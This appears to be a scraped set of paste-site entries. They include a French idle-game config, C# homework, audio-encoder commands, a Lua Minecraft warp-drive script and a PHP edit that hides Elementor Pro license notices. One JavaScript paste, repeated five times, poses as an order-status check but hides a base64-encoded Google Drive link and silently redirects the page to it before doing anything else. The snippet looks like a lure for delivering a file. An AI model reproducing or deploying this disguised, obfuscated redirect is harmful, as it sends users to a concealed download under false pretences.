		cost:50000 kebabs
		passive:multiply yield of cuisine by 2
		passive:multiply yield of restlocal by 2
		req:(cuisines>=10 or restslocal>=10)
		
	*buildingUpgrade5
		name:Aire de jeux
		desc:Ca attire les gosses donc les parents!<//><b>Effet:</b><.>cuisine x2<.>restaurants locaux x2
		icon:https://i.imgur.com/Kli5MIe.png
		cost:5000000 kebabs
		passive:multiply yield of cuisine by 3
		passive:multiply yield of restlocal by 3
		req:(cuisines>=50 or restslocal>=50)
		
	*buildingUpgrade6
		name:Télévision branchée H24
		desc:Télévisions branchés tout le temps sur des matchs de foot.<//><b>Effet:</b><.>toutes franchises x2
		icon:https://i.imgur.com/AvD8Ajn.png
		cost:1000000 kebabs
		passive:multiply yield of franchisel by 2
		passive:multiply yield of franchisei by 2
		req:(franchisesl>=10 or franchisesi>=10)
		
	*buildingUpgrade7
		name:Traduction du Menu
		desc:En 92 langues différentes incluant le zoulou!<//><b>Effet:</b><.>toutes franchises x2
		icon:https://i.imgur.com/XTbfPre.png
		cost:500000000 kebabs
		passive:multiply yield of franchisel by 4
		passive:multiply yield of franchisei by 4
		req:(franchisesl>=50 or franchisesi>=50)
		
	*buildingUpgrade8
		name:Engrenage surpuissant
		desc:Huile de friture dans les engrenages.<//><b>Effet:</b><.>usines x2
		icon:https://i.imgur.com/YAiYDK8.png
		cost:1000000000 kebabs
		passive:multiply yield of usinekeb by 2
		req:10 usinekeb
    *television
		name:Publicité de masse
		desc:Vous êtes passez à la télévision et plus de gens vous critique.<//><b>Effet:</b><.>1% de chance de gagner un titre en faisant des kebabs
		icon:https://i.imgur.com/89CKmgC.png
		cost:1 trophy
		req:1 trophy:earned and franchisei>=1
    *jpcresur
		name:Résurrection
		desc:Faites resortir Jean-Pierre Coffe de sa tombe !<//><b>Effet:</b><.>Jean Pierre Coffe apparaît plus souvent.
		icon:https://i.imgur.com/tjaPlq8.png
		passive:multiply frequency of critiqueGastro by 0.7
		cost:30 trophies
		req:5 trophy:earned and franchisei>=1
	*transartifact
		name:Artéfact de la Transcendance
		desc:Vous trouvez cet artéfact aléatoirement dans les caisses de broche à kebab. Peut être sera t'il d'utilité ?<//><b>Effet:</b><.>Transcendance disponible.
		icon:https://i.imgur.com/64gAcVH.png
		cost:100 trophies
		req:50 trophies:earned and usinekeb>=1
	*pagecritique
		name:Page Critique
		desc:La page critique sur le site de votre kebab est ouverte!<//><b>Effect:</b><.>Un titre meilleur kebab apparaît toutes les 100 secondes
		icon:https://i.imgur.com/Mb7fcFj.png
		cost:75 trophies
		req:75 trophies:earned and usinekeb>=1"
HBPj8CJn,HW 4_3_2,rukvir,C#,Monday 24th of March 2025 04:08:18 PM CDT,"using System;

namespace HomeWork
{
    class Program
    {

        static void Main(string[] args)
        {
            const string exit = ""exit"";
            const string totalSum = ""sum"";

            string inputUser = """";
            int[] numbers = new int[0];
            int sumNumbers = 0;
            bool isRunning = true;

            while (isRunning)
            {
                Console.WriteLine(""Введите число"");
                inputUser = Console.ReadLine();

                if (inputUser == exit)
                {
                    isRunning = false;
                }
                else if (inputUser == totalSum)
                {
                    sumNumbers = 0;

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        sumNumbers += numbers[i];
                    }
                    Console.WriteLine($""Сумма массива = {sumNumbers} "");
                    Console.WriteLine(""-------------------"");
                }
                else if (int.TryParse(inputUser, out int number))
                {
                    int[] newNumbers = new int[numbers.Length + 1];

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        newNumbers[i] = numbers[i];
                    }

                    newNumbers[newNumbers.Length - 1] = number;
                    numbers = newNumbers;
                }
                else
                {
                    Console.WriteLine(""Некоректный ввод! Введите целое число."");
                }

                if (numbers.Length == 0)
                {
                    Console.WriteLine(""\nМассив пустой."");
                }
                else
                {
                    Console.WriteLine(""\nИтоговый массив:"");

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        Console.Write($""{numbers[i]} "");
                    }
                    Console.WriteLine(""\n"");
                }
            }

            Console.ReadKey();
        }
    }
}"
6M8mA3MA,qaac64 sample promts,Urik_Kane,Batch,Monday 24th of March 2025 04:07:03 PM CDT,"rem won't accept FLAC as input
rem won't read tags & artwork from WAV
rem without -d output folder will write file to current directory

qaac64 -V 100 --copy-artwork input -d outfolder


rem ALAC
rem -b 16 to force 16-bit depth in case input isn't

qaac64 -A -b 16 --copy-artwork input -d outfolder
"
UdApPCFn,Untitled,MiaMyLove,JavaScript,Monday 24th of March 2025 03:48:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/035/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AksJaDiL,Remove Elementor Acivation Notice,tommyosheawebdesign,PHP,Monday 24th of March 2025 03:43:04 PM CDT,"Install Elementor Free.

Download and install Pro Elements from https://proelements.org

File Location: /wp-content/plugins/pro-elements/license/admin.php



public function admin_license_details() {
    if ( ! current_user_can( 'manage_options' ) ) {
        return;
    }

    if ( $this->is_block_editor_page() ) {
        return;
    }

    $license_key = self::get_license_key();

    /**
     * @var Admin_Notices $admin_notices
     */
    $admin_notices = Plugin::elementor()->admin->get_component( 'admin-notices' );

    if ( empty( $license_key ) ) {
        // Disabled Elementor Pro license activation notice.
        return;
    }

    $license_data = API::get_license_data();

    if ( API::is_licence_pro_trial() ) {
        return;
    }

    $errors = self::get_errors_details();

    if ( ! $license_data['success'] && isset( $license_data['error'], $errors[ $license_data['error'] ] ) ) {
        $error_data = $errors[ $license_data['error'] ];

        $admin_notices->print_admin_notice( [
            'title' => $error_data['title'],
            'description' => $error_data['description'],
            'button' => [
                'text' => $error_data['button_text'],
                'url' => $error_data['button_url'],
                'type' => isset( $error_data['button_type'] ) ? $error_data['button_type'] : '',
            ],
        ] );

        return;
    }

    if ( API::is_license_active() && API::is_license_about_to_expire() ) {
        $renew_url = API::RENEW_URL;

        $title = sprintf(
            esc_html__( 'Your License Will Expire in %s.', 'elementor-pro' ),
            human_time_diff(
                current_time( 'timestamp' ),
                strtotime( $license_data['expires'] )
            )
        );

        if ( isset( $license_data['renewal_discount'] ) && 0 < $license_data['renewal_discount'] ) {
            $description = sprintf(
                esc_html__( 'Renew your license today, and get an exclusive, time-limited %s discount.', 'elementor-pro' ),
                $license_data['renewal_discount'] . '%'
            );
        } else {
            $description = esc_html__( 'Renew your license today, to keep getting feature updates, premium support, Pro widgets & unlimited access to the template library.', 'elementor-pro' );
        }

        $admin_notices->print_admin_notice( [
            'title' => $title,
            'description' => $description,
            'type' => 'warning',
            'button' => [
                'text' => esc_html__( 'Renew now', 'elementor-pro' ),
                'url' => $renew_url,
                'type' => 'warning',
            ],
        ] );
    }
}
"
k36fKX9V,Untitled,MiaMyLove,JavaScript,Monday 24th of March 2025 03:33:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/046/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QTDXxqLW,Dirk 自动驾驶,jaklsfjlsak,Lua,Monday 24th of March 2025 03:22:44 PM CDT,"```lua
local core = peripheral.find(""warpdriveShipCore"")
core.enable(true)
core.command(""IDLE"", false)
    
-- Make sure the temp file exists --
if fs.exists(""temp"") then
else
    fs.open(""temp"", ""w"")
    local h = fs.open(""temp"", ""w"")
    h.close()
end
------------------------------------

    local h = fs.open(""temp"", ""r"")
    if h.readAll() == ""t"" then 
        h.close()
        print(""Continually jumping..."")
        --local core = peripheral.find(""warpdriveShipCore"")
        
        --local h = fs.open(""temp"", ""r"")
        --if h.readAll() == ""t"" then 
            --h.close()
            core.enable(true)
            core.command(""IDLE"", false)
            sleep(1)
            core.command(""MANUAL"", true)
        --end
        
        print(""Press `space` to stop jumping"")
        
        local event, key = os.pullEvent(""key"")
        if key == keys.space then
            local h = fs.open(""temp"", ""w"")
            h.writeLine(""f"")
            h.close()
            print(""Movement stopped for next jump"")
        end

    else
    
    h.close()    

    print(""Please input forward movement: "")
    ForMove = tonumber(read())
    print(""Please input lateral movement: "")
    LatMove = tonumber(read())
    print(""Please input vertical movement: "")
    VerMove = tonumber(read())

    core.movement(ForMove, VerMove, LatMove)

    print(""Starting continual jumping"")
    print(""Press `Space` after a jump to stop jumping"")

    core.command(""MANUAL"", true)
    print(""Starting Auto-pilot"")

    local h = fs.open(""temp"", ""w"")
    h.write(""t"")
    h.close()

end
```"
sUZNFQsG,Untitled,MiaMyLove,JavaScript,Monday 24th of March 2025 03:18:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/285/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qpHKzH7X,Untitled,MiaMyLove,JavaScript,Monday 24th of March 2025 03:02:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/842/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UAwJZUz5,Untitled,MiaMyLove,JavaScript,Monday 24th of March 2025 02:47:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/323/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
